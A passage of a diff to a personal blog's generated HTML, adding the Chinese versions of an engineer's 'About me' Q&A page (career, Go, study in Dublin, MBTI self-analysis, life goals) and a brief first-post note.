 <p>Haha, ridiculous, right? It seems like I’ve always gotten it backward. People should live for themselves first and then for others, but I seem to always get it wrong—I achieve a lot first, then think about what I need. So, I envy those who truly live for themselves.</p>
 <h3 id="Do-you-like-traveling-If-you-could-travel-anywhere-where-would-you-go"><a href="#Do-you-like-traveling-If-you-could-travel-anywhere-where-would-you-go" class="headerlink" title="Do you like traveling? If you could travel anywhere, where would you go?"></a>Do you like traveling? If you could travel anywhere, where would you go?</h3><p>I do, as long as the person I’m with enjoys it, I will too.</p>
 <p>If I could, I’d go to the moon. I’d probably sit there watching the beautiful Earth. Maybe someday, when I’ve let go of all obsessions, I’d take off my oxygen mask—but I think that day will never come!</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://nansenli.com/zh-CN/post/2024/10/aboutme/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nansen Li (李楠森)">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Nansen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Nansen">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/zh-CN/post/2024/10/aboutme/" class="post-title-link" itemprop="url">关于我</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-10-11 20:55:02" itemprop="dateCreated datePublished" datetime="2024-10-11T20:55:02+01:00">2024-10-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-10-13 20:39:18" itemprop="dateModified" datetime="2024-10-13T20:39:18+01:00">2024-10-13</time>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/zh-CN/post/2024/10/aboutme/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="zh-CN/post/2024/10/aboutme/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h1><p>本文书写于 2024年10月11日，都柏林，爱尔兰。</p>
+<hr>
+<h2 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h2><p>大家好，我叫李楠森，曾用名李楠。我来自中国，是一名热爱科技的工程师。我拥有机械电子的本科学位和两个计算机科学的硕士学位，分别是嵌入式系统和自然语言处理。我曾在中国一家大型互联网公司担任过 Go 语言工程师，目前正在都柏林一所大学攻读硕士学位，主攻自然语言处理。</p>
+<p>我对前端和后端开发、系统架构、算法、游戏开发，以及生成式 AI（例如 Stable Diffusion 和 ChatGPT）有着浓厚的兴趣。我一直致力于提高自己的编程能力，也喜欢尝试新技术，保持对行业发展的敏感度。</p>
+<p>如果你对技术或者生活方式有相同的兴趣，欢迎联系我，我们可以一起讨论和交流。</p>
+<hr>
+<h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>我知道你会对我本人好奇，我会让 ChatGPT 提出一些问题，然后我再回答。看看这些问题是否满足了你的好奇心。</p>
+<h3 id="你最喜欢的编程语言是什么？为什么？"><a href="#你最喜欢的编程语言是什么？为什么？" class="headerlink" title="你最喜欢的编程语言是什么？为什么？"></a>你最喜欢的编程语言是什么？为什么？</h3><p>我喜欢 Go 语言。它简洁、现代且高效。它的设计理念是“少即是多”，非常节制，我喜欢有自己态度的语言。</p>
+<h3 id="除了工作和学习外，你平时有哪些爱好？"><a href="#除了工作和学习外，你平时有哪些爱好？" class="headerlink" title="除了工作和学习外，你平时有哪些爱好？"></a>除了工作和学习外，你平时有哪些爱好？</h3><p>我其实是个很无聊的人，一直不知道该做什么。学生时代可能最喜欢玩游戏吧，从小就喜欢玩各种游戏，特别是 PC 端的单机游戏。不过，工作以后这些爱好也没有时间再继续下去了。</p>
+<h3 id="你最喜欢的电影或电视剧是哪部？为什么？"><a href="#你最喜欢的电影或电视剧是哪部？为什么？" class="headerlink" title="你最喜欢的电影或电视剧是哪部？为什么？"></a>你最喜欢的电影或电视剧是哪部？为什么？</h3><p>我很少会说“喜欢”这个词，其实大部分作品如果认真欣赏，都会有闪光点。不过，最让我难以释怀的电影应该是《银翼杀手 2049》。结局中，K 躺在雪中的台阶上，慢慢合上了双眼，那一刻充满了孤独与反思，让我深有共鸣。</p>
+<h3 id="作为一个工程师，你认为最大的挑战是什么？"><a href="#作为一个工程师，你认为最大的挑战是什么？" class="headerlink" title="作为一个工程师，你认为最大的挑战是什么？"></a>作为一个工程师，你认为最大的挑战是什么？</h3><p>我觉得最大的挑战是人——如何处理自己，如何处理他人。工程和科学总有解决办法，但人没有一个真正的最优解。而幸运的是，我总能处理好这个挑战。</p>
+<h3 id="你为什么选择留学爱尔兰？这段经历对你有什么影响？"><a href="#你为什么选择留学爱尔兰？这段经历对你有什么影响？" class="headerlink" title="你为什么选择留学爱尔兰？这段经历对你有什么影响？"></a>你为什么选择留学爱尔兰？这段经历对你有什么影响？</h3><p>最初，我的目标是美国，但是后来我改变了主意，我开始瞄准其他国家，特别是英语国家，如澳大利亚、加拿大、新西兰。爱尔兰有很多科技公司，紧邻整个欧盟市场，所以我最终选择了爱尔兰。</p>
+<p>我不知道这段经历的具体影响，但它非常重大。这次经历彻底改变了我。</p>
+<h3 id="你平时会用什么方式放松自己，减轻压力？"><a href="#你平时会用什么方式放松自己，减轻压力？" class="headerlink" title="你平时会用什么方式放松自己，减轻压力？"></a>你平时会用什么方式放松自己，减轻压力？</h3><p>哈哈，这个问题好。我一直觉得自己不需要放松，觉得能承担任何压力。直到最近，我意识到自己需要更好地管理压力。因此，我开始尝试一些正念和冥想的方法，希望能帮助减压力。</p>
+<h3 id="你认为最能代表你性格的三个词是什么？"><a href="#你认为最能代表你性格的三个词是什么？" class="headerlink" title="你认为最能代表你性格的三个词是什么？"></a>你认为最能代表你性格的三个词是什么？</h3><p>三个词很难概括，不如换个角度。</p>
+<p>我觉得 MBTI 会更全面一点，我的性格类型是 INTJ 和 INTP 的混合体。</p>
+<p>在认知功能上，我拥有极强的内倾直觉 (Ni) 和内倾思考 (Ti)。我看不到现在的世界，Ni 让我总是看到未来的结局，一切在我眼中都指向某个概率中的视图，我看到无数的可能性交织在一起，就像薛定谔的猫一样叠加。我更关注内在的直觉、未来的可能性和世界的深层含义。</p>
+<p>Ti 让我不断质疑一切，追求世界的真相。我总是在各种可能性中理清每一个的权重，找出潜在路径，通向希望的未来。</p>
+<p>我的外倾思考 (Te) 和外倾直觉 (Ne) 也相当不错。Ne 帮助我扩展思维、应对变化，我需要它来社交和发散思维，探索世界的本质。</p>
+<p>Te 让我保持高效，以结果为导向，并且避免过度拖延。</p>
+<p>我的 Fi 也比较强，支撑上述技术认知功能的价值判断。配合 Ni 可以让我在关键时刻明白他人在想什么，稍微提升了一点社交能力。</p>
+<p>我的 Fe 还算凑合，毕竟都是成年人了。即使 Fe 再弱、再被 Ti 压制，最终也应该得到一些锻炼。</p>
+<p>我最弱的功能可能是 Se。我似乎总是和现实脱节，有时从梦中醒来时，发现自己居然在国外，产生了一种恍惚感，仿佛忘记了自己已经离开了家。</p>
+<p>弱小的 Se 让我忽视当前体验，缺乏现实感知，对身体需求不敏感。强烈的 Ni 让我看不到当下，我总是活在不同的未来中。因未来而开心、幸福，因未来而恐惧、焦虑，但绝不是因为现在。</p>
+<p>其次，我的 Si 也很弱。我讨厌大量的细节，明明通过 Ni 可以看到抽象精简的世界，为什么还要去理解这些琐碎的细节？</p>
+<p>低下的 Si 让我不喜欢传统，也很少从过去的经验中汲取教训。我相信自己的直觉，认为过去的错误和不良体验不代表什么。所以往往需要吃很多亏才能吸取教训。</p>
+<h3 id="在你看来，成功的定义是什么？"><a href="#在你看来，成功的定义是什么？" class="headerlink" title="在你看来，成功的定义是什么？"></a>在你看来，成功的定义是什么？</h3><p>知道自己想要什么，并为之努力，最终实现——这就是成功。我一直在寻找自己真正想要的东西，但有时候觉得目标并不明确，虽然也实现了很多目标，但还在不断探索中。也许在别人眼中我是成功的，但我觉得还有很多改进的地方。</p>
+<h3 id="你对未来有什么计划或目标？"><a href="#你对未来有什么计划或目标？" class="headerlink" title="你对未来有什么计划或目标？"></a>你对未来有什么计划或目标？</h3><p>也许我是一个俗人，目前阶段是想找一个合适的人，过一辈子。其他一切，或许是让这个结果变得更好。</p>
+<p>哈哈，可笑吧？我好像总是把事情搞反。人应该先为自己而活，然后再为他人而活，而我好像总是弄反了，我总是取得很多成就，然后才去思考自己需要什么。所以我很羡慕那些真正为自己而活的人。</p>
+<h3 id="你喜欢旅行吗？如果可以去任何地方旅行，你会选择哪里？"><a href="#你喜欢旅行吗？如果可以去任何地方旅行，你会选择哪里？" class="headerlink" title="你喜欢旅行吗？如果可以去任何地方旅行，你会选择哪里？"></a>你喜欢旅行吗？如果可以去任何地方旅行，你会选择哪里？</h3><p>喜欢，只要陪伴的人享受，我也会享受。</p>
+<p>如果可以，我会去月球。我可能会在月球上看着美丽的地球。也许有一天，当我放下了一切执念，我会在那时摘下自己的氧气面罩，当然，我想这一天永远不会到来！</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://nansenli.com/zh-CN/post/2024/10/myblog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nansen Li (李楠森)">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Nansen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Nansen">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/zh-CN/post/2024/10/myblog/" class="post-title-link" itemprop="url">我的博客</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-10-10 21:06:26" itemprop="dateCreated datePublished" datetime="2024-10-10T21:06:26+01:00">2024-10-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-10-11 01:20:45" itemprop="dateModified" datetime="2024-10-11T01:20:45+01:00">2024-10-11</time>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/zh-CN/post/2024/10/myblog/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="zh-CN/post/2024/10/myblog/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>我是李楠森，这里是我的第一篇笔记，我不知道我能记录多少内容，也不知道能记录多久，但是我会尽力坚持去记录。</p>
+<blockquote>
+<p>于 2024年10月11日凌晨 1点20分 爱尔兰 都柏林</p>
+</blockquote>
 
       
     </div>
